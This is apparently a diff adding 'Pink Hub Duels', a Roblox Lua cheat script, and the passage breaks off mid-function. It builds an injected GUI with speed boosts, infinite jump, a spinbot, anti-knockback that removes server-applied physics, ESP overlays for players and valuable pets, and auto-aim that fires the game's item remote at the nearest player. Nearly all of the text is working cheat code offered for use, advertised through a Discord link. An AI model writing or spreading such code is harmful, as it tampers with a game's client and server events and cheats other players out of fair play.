@@ -1,0 +1,1198 @@
+pcall(function() game.CoreGui:FindFirstChild("PinkHubUI"):Destroy() end)
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Stats = game:GetService("Stats")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local HRP = Character:WaitForChild("HumanoidRootPart")
+
+LocalPlayer.CharacterAdded:Connect(function(c)
+    Character = c
+    Humanoid = c:WaitForChild("Humanoid")
+    HRP = c:WaitForChild("HumanoidRootPart")
+end)
+
+local hitboxEnabled = false
+local antiKBEnabled = false
+local infJumpEnabled = false
+local spinEnabled = false
+local antiLagEnabled = false
+local unwalkEnabled = false
+local espBestEnabled = false
+local medusaEnabled = false
+local autoAimEnabled = false
+local playerESPEnabled = false
+
+local STEAL_MIN = 23
+local STEAL_MAX = 33
+local stealSpeed = 29
+
+local SPEED_MIN = 54
+local SPEED_MAX = 64
+local speedSpeed = 59
+
+local PANEL_W = 300
+local BAR_W = 200
+local TOGGLE_W = 40
+
+local Gui = Instance.new("ScreenGui", CoreGui)
+Gui.Name = "PinkHubUI"
+Gui.ResetOnSpawn = false
+Gui.IgnoreGuiInset = true
+
+local TopBar = Instance.new("Frame", Gui)
+TopBar.Size = UDim2.new(0, 520, 0, 36)
+TopBar.Position = UDim2.new(0.5, -260, 0, 10)
+TopBar.BackgroundColor3 = Color3.fromRGB(15,15,17)
+TopBar.BorderSizePixel = 0
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 8)
+local TopStroke = Instance.new("UIStroke", TopBar)
+TopStroke.Thickness = 2
+TopStroke.Color = Color3.fromRGB(221,37,192)
+
+local TopTitle = Instance.new("TextLabel", TopBar)
+TopTitle.Size = UDim2.new(1, -12, 1, 0)
+TopTitle.Position = UDim2.new(0, 6, 0, 0)
+TopTitle.BackgroundTransparency = 1
+TopTitle.Font = Enum.Font.GothamBold
+TopTitle.TextSize = 14
+TopTitle.TextColor3 = Color3.fromRGB(233,131,212)
+TopTitle.Text = "Pink Hub Duels | fps:    Ping:    | https://discord.gg/CHY3JBP2HT"
+TopTitle.TextXAlignment = Enum.TextXAlignment.Center
+TopTitle.TextYAlignment = Enum.TextYAlignment.Center
+
+local Main = Instance.new("Frame", Gui)
+Main.Size = UDim2.new(0,660,0,480)
+Main.Position = UDim2.new(0.5, -330, 0, 56)
+Main.BackgroundColor3 = Color3.fromRGB(12,12,14)
+Main.Active = true
+Main.Draggable = true
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0,10)
+local MainStroke = Instance.new("UIStroke", Main)
+MainStroke.Thickness = 3
+MainStroke.Color = Color3.fromRGB(221,37,192)
+
+local LeftPanel = Instance.new("Frame", Main)
+LeftPanel.Size = UDim2.new(0,PANEL_W,1,-40)
+LeftPanel.Position = UDim2.new(0,20,0,20)
+LeftPanel.BackgroundColor3 = Color3.fromRGB(15,15,17)
+Instance.new("UICorner", LeftPanel).CornerRadius = UDim.new(0,8)
+local LeftStroke = Instance.new("UIStroke", LeftPanel)
+LeftStroke.Thickness = 2
+LeftStroke.Color = Color3.fromRGB(221,37,192)
+
+local RightPanel = Instance.new("Frame", Main)
+RightPanel.Size = UDim2.new(0,PANEL_W,1,-40)
+RightPanel.Position = UDim2.new(0,340,0,20)
+RightPanel.BackgroundColor3 = Color3.fromRGB(15,15,17)
+Instance.new("UICorner", RightPanel).CornerRadius = UDim.new(0,8)
+local RightStroke = Instance.new("UIStroke", RightPanel)
+RightStroke.Thickness = 2
+RightStroke.Color = Color3.fromRGB(221,37,192)
+
+local function sectionTitle(parent, text, y)
+    local lbl = Instance.new("TextLabel", parent)
+    lbl.Size = UDim2.new(1, -16, 0, 26)
+    lbl.Position = UDim2.new(0, 8, 0, y)
+    lbl.BackgroundTransparency = 1
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 14
+    lbl.TextColor3 = Color3.fromRGB(233,131,212)
+    lbl.Text = text
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    return lbl
+end
+
+sectionTitle(LeftPanel, "Movement Settings", 8)
+sectionTitle(RightPanel, "Misc Settings", 8)
+
+local function makeSlider(parent, y, labelText, min, max, default)
+    local enabled = false
+    local value = default
+    local Label = Instance.new("TextLabel", parent)
+    Label.Text = labelText .. ": " .. value
+    Label.Size = UDim2.new(1, 0, 0, 18)
+    Label.Position = UDim2.new(0, 0, 0, y)
+    Label.BackgroundTransparency = 1
+    Label.Font = Enum.Font.GothamBold
+    Label.TextSize = 12
+    Label.TextColor3 = Color3.fromRGB(200,200,210)
+    Label.TextXAlignment = Enum.TextXAlignment.Center
+    local Bar = Instance.new("Frame", parent)
+    Bar.Size = UDim2.new(0, BAR_W, 0, 12)
+    Bar.Position = UDim2.new(0, (PANEL_W - BAR_W)/2, 0, y + 20)
+    Bar.BackgroundColor3 = Color3.fromRGB(28,28,32)
+    Instance.new("UICorner", Bar)
+    local BarStroke = Instance.new("UIStroke", Bar)
+    BarStroke.Thickness = 2
+    BarStroke.Color = Color3.fromRGB(221,37,192)
+    local p0 = (value - min) / (max - min)
+    if p0 < 0 then p0 = 0 elseif p0 > 1 then p0 = 1 end
+    local Fill = Instance.new("Frame", Bar)
+    Fill.Size = UDim2.new(p0, 0, 1, 0)
+    Fill.BackgroundColor3 = Color3.fromRGB(221,37,192)
+    Instance.new("UICorner", Fill)
+    local Dot = Instance.new("Frame", Bar)
+    Dot.Size = UDim2.new(0, 12, 0, 12)
+    Dot.AnchorPoint = Vector2.new(0.5, 0.5)
+    Dot.Position = UDim2.new(p0, 0, 0.5, 0)
+    Dot.BackgroundColor3 = Color3.fromRGB(245,110,215)
+    Dot.ZIndex = 5
+    Instance.new("UICorner", Dot)
+    local Toggle = Instance.new("TextButton", parent)
+    Toggle.Size = UDim2.new(0, TOGGLE_W, 0, 20)
+    Toggle.Position = UDim2.new(0, (PANEL_W - BAR_W)/2 + BAR_W + 4, 0, y + 14)
+    Toggle.BackgroundColor3 = Color3.fromRGB(22,22,26)
+    Toggle.Font = Enum.Font.GothamBold
+    Toggle.TextSize = 11
+    Toggle.Text = "OFF"
+    Toggle.TextColor3 = Color3.fromRGB(235,235,240)
+    Instance.new("UICorner", Toggle)
+    local function setState(state)
+        enabled = state and true or false
+        Toggle.Text = enabled and "ON" or "OFF"
+    end
+    Toggle.MouseButton1Click:Connect(function() setState(not enabled) end)
+    local dragging = false
+    local function update(input)
+        local x = input.Position.X
+        local bx = Bar.AbsolutePosition.X
+        local bw = Bar.AbsoluteSize.X
+        if bw <= 0 then return end
+        local p = math.clamp((x - bx) / bw, 0, 1)
+        value = math.floor(min + (max - min) * p + 0.5)
+        Fill.Size = UDim2.new(p, 0, 1, 0)
+        Dot.Position = UDim2.new(p, 0, 0.5, 0)
+        Label.Text = labelText .. ": " .. value
+    end
+    Bar.InputBegan:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            update(i)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+            update(i)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(i)
+        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+    local function getter() return enabled, value end
+    return getter, setState
+end
+
+local function createButton(parent, y, text)
+    local b = Instance.new("TextButton", parent)
+    b.Size = UDim2.new(0,240,0,32)
+    b.Position = UDim2.new(0, (PANEL_W - 240)/2, 0, y)
+    b.BackgroundColor3 = Color3.fromRGB(22,22,26)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 13
+    b.TextColor3 = Color3.fromRGB(235,235,240)
+    b.Text = text .. ": OFF"
+    Instance.new("UICorner", b)
+    return b
+end
+
+local speedFunc, speedSet = makeSlider(LeftPanel, 36, "Speed Boost", SPEED_MIN, SPEED_MAX, speedSpeed)
+local stealFunc, stealSet = makeSlider(LeftPanel, 112, "Steal Boost", STEAL_MIN, STEAL_MAX, stealSpeed)
+
+local saveBtn = Instance.new("TextButton", LeftPanel)
+saveBtn.Size = UDim2.new(0,240,0,32)
+saveBtn.Position = UDim2.new(0, (PANEL_W - 240)/2, 0, 170)
+saveBtn.BackgroundColor3 = Color3.fromRGB(221,37,192)
+saveBtn.Font = Enum.Font.GothamBold
+saveBtn.TextSize = 13
+saveBtn.TextColor3 = Color3.fromRGB(255,255,255)
+saveBtn.Text = "Save Config"
+Instance.new("UICorner", saveBtn)
+
+local infBtn = createButton(LeftPanel, 212, "Infinite Jump")
+local unwalkBtn = createButton(LeftPanel, 256, "Unwalk")
+local spinBtn = createButton(LeftPanel, 300, "Spinbot")
+
+local startY = 40
+local gap = 56
+local hitboxBtn = createButton(RightPanel, startY + gap * 0, "Hitbox Expander")
+local antiKBtn = createButton(RightPanel, startY + gap * 1, "Anti Knockback")
+local antiLagBtn = createButton(RightPanel, startY + gap * 2, "Anti Lag")
+local espBtn = createButton(RightPanel, startY + gap * 3, "ESP Best")
+local medusaBtn = createButton(RightPanel, startY + gap * 4, "Medusa Range")
+local autoAimBtn = createButton(RightPanel, startY + gap * 5, "Auto Aim")
+local playerESPBtn = createButton(RightPanel, startY + gap * 6, "Player ESP")
+
+local infJumpCon = {}
+local jumpForce = 50
+local clampFallSpeed = 80
+local originalUseJumpPower = nil
+local originalJumpPower = nil
+
+local function DisableInfJump()
+    for _,c in pairs(infJumpCon) do pcall(function() c:Disconnect() end) end
+    infJumpCon = {}
+    if Humanoid and originalUseJumpPower ~= nil and originalJumpPower ~= nil then
+        pcall(function()
+            Humanoid.UseJumpPower = originalUseJumpPower
+            Humanoid.JumpPower = originalJumpPower
+        end)
+    end
+end
+
+local function EnableInfJump()
+    if originalUseJumpPower == nil and Humanoid then
+        pcall(function()
+            originalUseJumpPower = Humanoid.UseJumpPower
+            originalJumpPower = Humanoid.JumpPower
+        end)
+    end
+    DisableInfJump()
+    table.insert(infJumpCon, RunService.Heartbeat:Connect(function()
+        if not infJumpEnabled then return end
+        local char = LocalPlayer.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp and hrp.Velocity.Y < -clampFallSpeed then
+            hrp.Velocity = Vector3.new(hrp.Velocity.X, -clampFallSpeed, hrp.Velocity.Z)
+        end
+    end))
+    table.insert(infJumpCon, UserInputService.JumpRequest:Connect(function()
+        if not infJumpEnabled then return end
+        local char = LocalPlayer.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            local currentVelocity = hrp.Velocity
+            local moveDirection = Humanoid.MoveDirection
+            local horizontalVelocity = Vector3.new(currentVelocity.X, 0, currentVelocity.Z)
+            if moveDirection.Magnitude > 0 then
+                local moveDirectionNormalized = moveDirection.Unit
+                local newHorizontalVelocity = moveDirectionNormalized * horizontalVelocity.Magnitude
+                hrp.Velocity = Vector3.new(newHorizontalVelocity.X, jumpForce, newHorizontalVelocity.Z)
+            else
+                hrp.Velocity = Vector3.new(currentVelocity.X, jumpForce, currentVelocity.Z)
+            end
+        end
+    end))
+end
+
+local spinConnection = nil
+local SPIN_SPEED = 35
+local function addSpin(character)
+    local hrp = character:WaitForChild("HumanoidRootPart",5)
+    if not hrp then return end
+    if hrp:FindFirstChild("SpinbotSpin") then return end
+    local bav = Instance.new("BodyAngularVelocity")
+    bav.Name = "SpinbotSpin"
+    bav.AngularVelocity = Vector3.new(0,SPIN_SPEED,0)
+    bav.MaxTorque = Vector3.new(0,1e7,0)
+    bav.P = 1250
+    bav.Parent = hrp
+end
+local function removeSpin(character)
+    local hrp = character and character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        local spin = hrp:FindFirstChild("SpinbotSpin")
+        if spin then spin:Destroy() end
+    end
+end
+local function EnableSpin()
+    if LocalPlayer.Character then addSpin(LocalPlayer.Character) end
+    if spinConnection then spinConnection:Disconnect() spinConnection = nil end
+    spinConnection = LocalPlayer.CharacterAdded:Connect(function(char)
+        task.wait(0.5)
+        addSpin(char)
+    end)
+end
+local function DisableSpin()
+    if spinConnection then spinConnection:Disconnect() spinConnection = nil end
+    if LocalPlayer.Character then removeSpin(LocalPlayer.Character) end
+end
+
+local lagConnection = nil
+local function cleanChar(char)
+    for _,v in pairs(char:GetDescendants()) do
+        if v:IsA("Clothing") or v:IsA("CharacterMesh") then v:Destroy()
+        elseif v:IsA("BasePart") then
+            local m = v:FindFirstChildWhichIsA("SpecialMesh")
+            if m then m:Destroy() end
+        end
+    end
+end
+local function EnableAntiLag()
+    if LocalPlayer.Character then cleanChar(LocalPlayer.Character) end
+    if lagConnection then lagConnection:Disconnect() lagConnection = nil end
+    lagConnection = LocalPlayer.CharacterAdded:Connect(cleanChar)
+end
+local function DisableAntiLag()
+    if lagConnection then lagConnection:Disconnect() lagConnection = nil end
+end
+
+local v49 = {}
+local v48 = false
+local function EnableAntiKnockback()
+    if not v48 then
+        v48 = true
+        local l_Players_0 = game:GetService("Players")
+        local l_ReplicatedStorage_0 = game:GetService("ReplicatedStorage")
+        local l_Workspace_1 = game:GetService("Workspace")
+        local l_RunService_1 = game:GetService("RunService")
+        local l_LocalPlayer_1 = l_Players_0.LocalPlayer
+        local v55 = l_LocalPlayer_1.Character or l_LocalPlayer_1.CharacterAdded:Wait()
+        local l_Humanoid_1 = v55:WaitForChild("Humanoid")
+        local l_HumanoidRootPart_1 = v55:WaitForChild("HumanoidRootPart")
+        local l_CurrentCamera_0 = l_Workspace_1.CurrentCamera
+        local l_Animator_0 = l_Humanoid_1:WaitForChild("Animator")
+        local v60 = 40
+        local v61 = 25
+        local v62 = 15
+        local v63 = true
+        local v64 = Vector3.new(0, 0, 0)
+        local function v67()
+            local l_l_Humanoid_1_State_0 = l_Humanoid_1:GetState()
+            if l_l_Humanoid_1_State_0 ~= Enum.HumanoidStateType.Physics and l_l_Humanoid_1_State_0 ~= Enum.HumanoidStateType.Ragdoll and l_l_Humanoid_1_State_0 ~= Enum.HumanoidStateType.FallingDown and l_l_Humanoid_1_State_0 ~= Enum.HumanoidStateType.GettingUp then
+                local _ = false
+            end
+            return true
+        end
+        local function v69()
+            pcall(function()
+                local l_PlayerModule_0 = l_LocalPlayer_1:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")
+                require(l_PlayerModule_0):GetControls():Enable()
+            end)
+        end
+        local function v77()
+            for _, v71 in pairs(v55:GetDescendants()) do
+                if not v71:IsA("BallSocketConstraint") and not v71:IsA("NoCollisionConstraint") and not v71:IsA("HingeConstraint") and (not v71:IsA("Attachment") or v71.Name ~= "A" and v71.Name ~= "B") then
+                    if v63 and (v71:IsA("BodyVelocity") or v71:IsA("BodyPosition") or v71:IsA("BodyGyro")) then
+                        v71:Destroy()
+                    end
+                else
+                    v71:Destroy()
+                end
+            end
+            for _, v73 in pairs(v55:GetDescendants()) do
+                if v73:IsA("Motor6D") then
+                    v73.Enabled = true
+                end
+            end
+            for _, v75 in pairs(l_Animator_0:GetPlayingAnimationTracks()) do
+                local v76 = not not v75.Animation and v75.Animation.Name:lower() or ""
+                if v76:find("rag") or v76:find("fall") or v76:find("hurt") or v76:find("down") then
+                    v75:Stop(0)
+                end
+            end
+        end
+        table.insert(v49, l_Humanoid_1.StateChanged:Connect(function(_, _)
+            if v67() then
+                l_Humanoid_1:ChangeState(Enum.HumanoidStateType.Running)
+                v77()
+                l_CurrentCamera_0.CameraSubject = l_Humanoid_1
+                v69()
+            end
+        end))
+        pcall(function()
+            table.insert(v49, l_ReplicatedStorage_0.Packages.Net["RE/CombatService/ApplyImpulse"].OnClientEvent:Connect(function()
+                if v67() then
+                    l_HumanoidRootPart_1.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                end
+            end))
+        end)
+        table.insert(v49, v55.DescendantAdded:Connect(function()
+            if v67() then
+                v77()
+            end
+        end))
+        table.insert(v49, l_RunService_1.Heartbeat:Connect(function()
+            if v67() then
+                v77()
+                local l_AssemblyLinearVelocity_0 = l_HumanoidRootPart_1.AssemblyLinearVelocity
+                if (l_AssemblyLinearVelocity_0 - v64).Magnitude > v60 and l_AssemblyLinearVelocity_0.Magnitude > v61 then
+                    l_HumanoidRootPart_1.AssemblyLinearVelocity = l_AssemblyLinearVelocity_0.Unit * math.min(l_AssemblyLinearVelocity_0.Magnitude, v62)
+                end
+                v64 = l_AssemblyLinearVelocity_0
+            end
+        end))
+        v69()
+        v77()
+        table.insert(v49, l_LocalPlayer_1.CharacterAdded:Connect(function(v81)
+            v55 = v81
+            l_Humanoid_1 = v81:WaitForChild("Humanoid")
+            l_HumanoidRootPart_1 = v81:WaitForChild("HumanoidRootPart")
+            l_Animator_0 = l_Humanoid_1:WaitForChild("Animator")
+            v64 = Vector3.new(0, 0, 0)
+            v69()
+            v77()
+        end))
+    end
+end
+EnableAntiKnockback()
+
+local unwalkConns = {}
+local unwalkCharConn = nil
+local storedAnims = {walk = {}, run = {}}
+local idleAnimId = nil
+local idleTrack = nil
+
+local function storeAndRemoveWalkRun(char)
+    local animate = char and char:FindFirstChild("Animate")
+    if not animate then return end
+    local idleFolder = animate:FindFirstChild("idle")
+    if idleFolder then
+        local a = idleFolder:FindFirstChildOfClass("Animation")
+        if a then idleAnimId = a.AnimationId end
+    end
+    for _, tag in ipairs({"walk","run"}) do
+        local folder = animate:FindFirstChild(tag)
+        if folder then
+            local children = folder:GetChildren()
+            for i = #children,1,-1 do
+                local child = children[i]
+                if child:IsA("Animation") then
+                    table.insert(storedAnims[tag], child.AnimationId)
+                    child:Destroy()
+                end
+            end
+        end
+    end
+end
+
+local function restoreAnimsToAnimate(char)
+    local animate = char and char:FindFirstChild("Animate")
+    if not animate then return end
+    for _, tag in ipairs({"walk","run"}) do
+        local folder = animate:FindFirstChild(tag)
+        if not folder then
+            folder = Instance.new("Folder")
+            folder.Name = tag
+            folder.Parent = animate
+        end
+        for _, animId in ipairs(storedAnims[tag]) do
+            if type(animId) == "string" then
+                local newAnim = Instance.new("Animation")
+                newAnim.Name = "restored"
+                newAnim.AnimationId = animId
+                newAnim.Parent = folder
+            end
+        end
+        storedAnims[tag] = {}
+    end
+end
+
+local function stopAllPlaying(hum)
+    for _, t in pairs(hum:GetPlayingAnimationTracks()) do
+        pcall(function() t:Stop() end)
+    end
+    if idleTrack then pcall(function() idleTrack:Stop() end) idleTrack = nil end
+end
+
+local function ensureIdlePlaying(hum)
+    if not idleAnimId then return end
+    if idleTrack and idleTrack.IsPlaying then return end
+    local animObj = Instance.new("Animation")
+    animObj.AnimationId = idleAnimId
+    local ok, track = pcall(function() return hum:LoadAnimation(animObj) end)
+    if ok and track then pcall(function() track:Play() end) idleTrack = track end
+    pcall(function() animObj:Destroy() end)
+end
+
+local function startUnwalk()
+    if unwalkCharConn then return end
+    if LocalPlayer.Character then storeAndRemoveWalkRun(LocalPlayer.Character) end
+    unwalkCharConn = LocalPlayer.CharacterAdded:Connect(function(c)
+        task.wait(0.5)
+        storeAndRemoveWalkRun(c)
+    end)
+    table.insert(unwalkConns, RunService.RenderStepped:Connect(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hum then return end
+        if hum.MoveDirection.Magnitude > 0.1 then
+            stopAllPlaying(hum)
+        else
+            ensureIdlePlaying(hum)
+        end
+    end))
+end
+
+local function stopUnwalk()
+    if unwalkCharConn then unwalkCharConn:Disconnect() unwalkCharConn = nil end
+    for _,c in pairs(unwalkConns) do pcall(function() c:Disconnect() end) end
+    unwalkConns = {}
+    local char = LocalPlayer.Character
+    if char then restoreAnimsToAnimate(char) end
+    if idleTrack then pcall(function() idleTrack:Stop() end) idleTrack = nil end
+    idleAnimId = nil
+end
+
+getgenv().BestPetESP = getgenv().BestPetESP or {active = false, loop = nil, currentESP = nil}
+local function parseValue(text)
+    text = tostring(text or ""):gsub("%s", "")
+    local num, suffix = text:match("([%d%.]+)([KkMmBbTt]?)")
+    if not num then return 0 end
+    num = tonumber(num) or 0
+    local multipliers = {K=1e3, M=1e6, B=1e9, T=1e12}
+    local mult = multipliers[(suffix or ""):upper()] or 1
+    return num * mult
+end
+local function createESP(part, displayText, valueText)
+    if getgenv().BestPetESP.currentESP then
+        pcall(function() getgenv().BestPetESP.currentESP:Destroy() end)
+        getgenv().BestPetESP.currentESP = nil
+    end
+    if not part then return end
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "BestPetESP"
+    bb.Size = UDim2.new(0, 200, 0, 50)
+    bb.AlwaysOnTop = true
+    bb.StudsOffset = Vector3.new(0, 3, 0)
+    bb.Adornee = part
+    bb.Parent = CoreGui
+    local name = Instance.new("TextLabel", bb)
+    name.Size = UDim2.new(1, 0, 0, 25)
+    name.BackgroundTransparency = 1
+    name.TextScaled = true
+    name.Font = Enum.Font.GothamBold
+    name.Text = displayText
+    name.TextColor3 = Color3.fromRGB(255, 255, 0)
+    name.TextStrokeTransparency = 0.5
+    local value = Instance.new("TextLabel", bb)
+    value.Size = UDim2.new(1, 0, 0, 25)
+    value.Position = UDim2.new(0, 0, 0, 25)
+    value.BackgroundTransparency = 1
+    value.TextScaled = true
+    value.Font = Enum.Font.GothamBold
+    value.Text = valueText
+    value.TextColor3 = Color3.fromRGB(0, 255, 100)
+    value.TextStrokeTransparency = 0.5
+    getgenv().BestPetESP.currentESP = bb
+end
+local function startESP()
+    if getgenv().BestPetESP.active then return end
+    getgenv().BestPetESP.active = true
+    getgenv().BestPetESP.loop = task.spawn(function()
+        while getgenv().BestPetESP.active do
+            local debris = Workspace:FindFirstChild("Debris")
+            if not debris then task.wait(0.5) continue end
+            local bestPet = {value = -1, part = nil, text = "", display = "", template = nil}
+            for _, template in ipairs(debris:GetChildren()) do
+                if template.Name == "FastOverheadTemplate" then
+                    local surfaceGui = template:FindFirstChildOfClass("SurfaceGui")
+                    if not surfaceGui then continue end
+                    local genLabel = surfaceGui:FindFirstChild("Generation", true)
+                    if not genLabel or not genLabel:IsA("TextLabel") then continue end
+                    local text = genLabel.Text or ""
+                    if text ~= "" and (text:find("/s") or text:find("K") or text:find("M") or text:find("B")) then
+                        local val = parseValue(text)
+                        if val > bestPet.value then
+                            local targetPart = surfaceGui.Adornee
+                            if targetPart and targetPart:IsA("BasePart") then
+                                local displayName = surfaceGui:FindFirstChild("DisplayName", true)
+                                bestPet = {
+                                    part = targetPart,
+                                    value = val,
+                                    text = text,
+                                    display = displayName and displayName.Text or "Pet",
+                                    template = template
+                                }
+                            end
+                        end
+                    end
+                end
+            end
+            if bestPet.part and bestPet.part.Parent then
+                createESP(bestPet.part, bestPet.display, bestPet.text)
+            end
+            task.wait(0.5)
+        end
+        if getgenv().BestPetESP.currentESP then pcall(function() getgenv().BestPetESP.currentESP:Destroy() end) getgenv().BestPetESP.currentESP = nil end
+    end)
+end
+local function stopESP()
+    getgenv().BestPetESP.active = false
+    if getgenv().BestPetESP.loop then
+        pcall(function() task.cancel(getgenv().BestPetESP.loop) end)
+        getgenv().BestPetESP.loop = nil
+    end
+    if getgenv().BestPetESP.currentESP then pcall(function() getgenv().BestPetESP.currentESP:Destroy() end) getgenv().BestPetESP.currentESP = nil end
+end
+
+local medusaCircles = {}
+local medusaConnection = nil
+local MEDUSA_RANGE = 18
+
+local function createMedusaForPlayer(plr)
+    if medusaCircles[plr] then return end
+    local char = plr.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if not hrp or not humanoid then return end
+    local circle = Instance.new("CylinderHandleAdornment")
+    circle.Name = "MedusaCircle_" .. plr.UserId
+    circle.Adornee = hrp
+    circle.Radius = MEDUSA_RANGE
+    circle.Height = 0.1
+    circle.Color3 = Color3.fromRGB(180, 0, 255)
+    circle.Transparency = 0.35
+    circle.AlwaysOnTop = true
+    circle.ZIndex = 5
+    circle.Parent = CoreGui
+    medusaCircles[plr] = {circle = circle, humanoid = humanoid, hrp = hrp}
+end
+
+local function removeMedusaForPlayer(plr)
+    local entry = medusaCircles[plr]
+    if not entry then return end
+    pcall(function() if entry.circle then entry.circle:Destroy() end end)
+    medusaCircles[plr] = nil
+end
+
+local function removeMedusaCircles()
+    for plr, entry in pairs(medusaCircles) do
+        pcall(function() if entry.circle then entry.circle:Destroy() end end)
+    end
+    medusaCircles = {}
+end
+
+local function updateMedusaCircles()
+    for plr, entry in pairs(medusaCircles) do
+        if not plr or not entry then
+            medusaCircles[plr] = nil
+        else
+            local hrp = entry.hrp
+            local humanoid = entry.humanoid
+            if hrp and humanoid and hrp.Parent then
+                local offset = -(humanoid.HipHeight + 1.8)
+                entry.circle.CFrame = CFrame.new(0, offset, 0) * CFrame.Angles(math.rad(90), 0, 0)
+            else
+                removeMedusaForPlayer(plr)
+            end
+        end
+    end
+end
+
+local function updateMedusaList()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            if not medusaCircles[plr] then
+                createMedusaForPlayer(plr)
+            end
+        end
+    end
+    for plr, entry in pairs(medusaCircles) do
+        if not plr.Character or not plr.Character.Parent then
+            removeMedusaForPlayer(plr)
+        end
+    end
+end
+
+local function enableMedusa()
+    updateMedusaList()
+    if medusaConnection then medusaConnection:Disconnect() medusaConnection = nil end
+    medusaConnection = RunService.RenderStepped:Connect(function()
+        updateMedusaList()
+        updateMedusaCircles()
+    end)
+    Players.PlayerRemoving:Connect(function(plr) removeMedusaForPlayer(plr) end)
+end
+
+local function disableMedusa()
+    if medusaConnection then medusaConnection:Disconnect() medusaConnection = nil end
+    removeMedusaCircles()
+end
+
+local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+local char = Character
+local HRPref = HRP
+local Event = nil
+pcall(function()
+    Event = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/UseItem")
+end)
+local autoAimRange = 100
+local laserConnection = nil
+local webConnection = nil
+
+local function getNearestPlayer(maxRange)
+    maxRange = maxRange or math.huge
+    if not LocalPlayer.Character then return nil end
+    local myPos = HRP and HRP.Position or Vector3.new(0,0,0)
+    local nearest = nil
+    local shortest = maxRange
+    for _, pl in ipairs(Players:GetPlayers()) do
+        if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = pl.Character.HumanoidRootPart
+            local dist = (hrp.Position - myPos).Magnitude
+            if dist < shortest then
+                shortest = dist
+                nearest = pl
+            end
+        end
+    end
+    return nearest
+end
+
+local function useLaserCape(targetPart)
+    if not Event then return end
+    if not targetPart then return end
+    local args = {targetPart.Position, targetPart}
+    pcall(function()
+        Event:FireServer(unpack(args))
+    end)
+end
+
+local function useWebSlinger(targetPart)
+    if not Event then return end
+    if not targetPart then return end
+    local tool = backpack:FindFirstChild("Web Slinger") or (char and char:FindFirstChild("Web Slinger"))
+    if tool and tool:FindFirstChild("Handle") then
+        local handle = tool.Handle
+        local args = {
+            Vector3.new(targetPart.Position.X, targetPart.Position.Y, targetPart.Position.Z),
+            targetPart,
+            handle
+        }
+        pcall(function()
+            Event:FireServer(unpack(args))
+        end)
+    end
+end
+
+local function setupLaserAim()
+    backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+    char = LocalPlayer.Character
+    local laserTool = backpack:FindFirstChild("Laser Cape") or (char and char:FindFirstChild("Laser Cape"))
+    if not laserTool then return end
+    if laserConnection then
+        pcall(function() laserConnection:Disconnect() end)
+        laserConnection = nil
+    end
+    if laserTool and laserTool.Activated then
+        laserConnection = laserTool.Activated:Connect(function()
+            local target = getNearestPlayer(autoAimRange)
+            if target and target.Character then
+                local targetPart = target.Character:FindFirstChild("HumanoidRootPart")
+                if targetPart then
+                    useLaserCape(targetPart)
+                end
+            end
+        end)
+    end
+end
+
+local function setupWebAim()
+    backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+    char = LocalPlayer.Character
+    local webTool = backpack:FindFirstChild("Web Slinger") or (char and char:FindFirstChild("Web Slinger"))
+    if not webTool then
+        pcall(function()
+            ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/CoinsShopService/RequestBuy"):InvokeServer("Web Slinger")
+        end)
+        task.wait(1)
+        webTool = backpack:FindFirstChild("Web Slinger") or (char and char:FindFirstChild("Web Slinger"))
+    end
+    if not webTool then return end
+    if webConnection then
+        pcall(function() webConnection:Disconnect() end)
+        webConnection = nil
+    end
+    if webTool and webTool.Activated then
+        webConnection = webTool.Activated:Connect(function()
+            local target = getNearestPlayer(autoAimRange)
+            if target and target.Character then
+                local targetPart = target.Character:FindFirstChild("HumanoidRootPart")
+                if targetPart then
+                    useWebSlinger(targetPart)
+                end
+            end
+        end)
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    char = character
+    HRP = character:WaitForChild("HumanoidRootPart")
+    backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack")
+    if autoAimEnabled then
+        task.wait(1)
+        pcall(function() setupLaserAim() end)
+        pcall(function() setupWebAim() end)
+    end
+    if originalUseJumpPower == nil and Humanoid then
+        pcall(function()
